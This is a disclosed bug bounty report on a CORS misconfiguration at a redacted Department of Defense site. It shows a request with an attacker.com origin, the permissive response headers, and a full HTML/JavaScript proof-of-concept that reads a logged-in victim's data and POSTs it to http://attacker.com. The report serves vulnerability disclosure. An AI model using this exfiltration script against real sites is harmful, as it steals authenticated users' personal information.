# (CORS) Cross-origin resource sharing misconfiguration on https://█████████

## Report Details
- **Report ID**: 995144
- **URL**: https://hackerone.com/reports/995144
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-30T19:35:49.063Z
- **Disclosed**: 2022-02-14T21:18:26.661Z

## Reporter
- **Username**: fiveguyslover
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Step-by-step Reproduction :


Send this request:
```
GET /██████████ HTTP/1.1
Host: █████
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
█████████
Origin: http://attacker.com

```
Receive : 

```
HTTP/1.1 200 OK
Cache-Control: max-age=0,must-revalidate
Expires: Wed, 31 Dec 1969 16:00:00 PST
Vary: Origin
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true
```

`Access-Control-Allow-Origin: http://attacker.com`
`Access-Control-Allow-Credentials: true`

cURL with response header 

██████


So you can write exploit:

```
<!DOCTYPE html>
<html>
<body>
<center>
<h2>exploit</h2>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText;
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://attacker.com", true);
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://█████/██████", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

POC VIDEO

██████████

## Impact

Attacker would treat many victims to visit attacker’s website, if victim is logged in, then his personal information is recorded in attacker’s server.

## Attachments
No attachments
